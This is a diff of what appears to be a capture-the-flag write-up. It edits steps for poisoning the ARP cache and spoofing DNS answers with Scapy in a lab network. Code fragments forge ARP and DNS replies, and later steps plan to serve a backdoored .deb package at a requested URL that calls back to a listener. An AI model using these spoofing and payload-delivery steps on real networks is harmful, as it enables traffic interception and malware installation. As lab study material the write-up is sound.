@@ -402,39 +402,13 @@ https://www.cloudshark.org/captures/0320b9b57d35
 - Step 2: Do and "ls" of the home folder.
 - Step 3: Read "HELP.md"
 
-- Step 4: Read arp.pcap
-~~~
-guest@d6fc16938bc6:~/pcaps$ tshark -nnr arp.pcap
-    1   0.000000 cc:01:10:dc:00:00 → ff:ff:ff:ff:ff:ff ARP 60 Who has 10.10.10.1? Tell 10.10.10.2
-    2   0.031000 cc:00:10:dc:00:00 → cc:01:10:dc:00:00 ARP 60 10.10.10.1 is at cc:00:10:dc:00:00
-~~~
 
-- Step 5: Read dns.pcap
-~~~
-guest@d6fc16938bc6:~/pcaps$ tshark -nnr dns.pcap
-    1   0.000000 192.168.170.8 → 192.168.170.20 DNS 74 Standard query 0x75c0 A www.netbsd.org
-    2   0.048911 192.168.170.20 → 192.168.170.8 DNS 90 Standard query response 0x75c0 A www.netbsd.org A 204.152.190.12
+- Step 4: Run "tshark -i eth0"
+- Step 5: Notice that .35 is asking about .53
+
+- Step 6: Create ARP response: 
 ~~~
 
-- Step 5: Run "tcpdump -nni eth0"
-- Step 6: Inspect /scripts/arp_resp.py
-- Step 7: Notice the following:
-	- My IP is 		**10.6.0.2** (likely to change)
-		- mac: 02:42:0a:06:00:02 (likely to change)
-	- Malware IP is 	**10.6.6.35**
-		- mac: 4c:24:57:ab:ed:84
-	- Malware dest IP is 	**10.6.6.53**
-	- Router
-		- mac: 12:63:48:bc:c6:9d	
-- Step 8: Notice that .35 is asking about .53
-- Step 9: This link is interesting:
-
-https://medium.com/datadriveninvestor/arp-cache-poisoning-using-scapy-d6711ecbe112 
-
-- Step 10: Create ARP response: 
-
-~~~
-        
         ether_resp = Ether(dst=packet.hwsrc, type=0x806, src=macaddr)
 
         arp_response = ARP(pdst=packet.psrc)
@@ -454,10 +428,9 @@ https://medium.com/datadriveninvestor/arp-cache-poisoning-using-scapy-d6711ecbe1
         sendp(response, iface="eth0")
 ~~~
 
-- Step 11: Create DNS response:
-
-This works!
+- Step 7: Create DNS response:
 ~~~
+
     eth = Ether(src=packet.dst, dst=packet.src)      # need to replace mac addresses
     ip  = IP(dst=packet[IP].src, src=packet[IP].dst) # need to replace IP addresses
     udp = UDP(dport=packet[UDP].sport, sport=53)     # need to replace ports
@@ -470,10 +443,10 @@ This works!
     )
 ~~~
 
-- Step 12: Note file being requested with http request.
+- Step 8: Note file being requested with http request.
 	- "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"
 
-- Step 13: Create that file and make it call back to listener on local machine.
+- Step 9: Create that file and make it call back to listener on local machine.
 
 
 
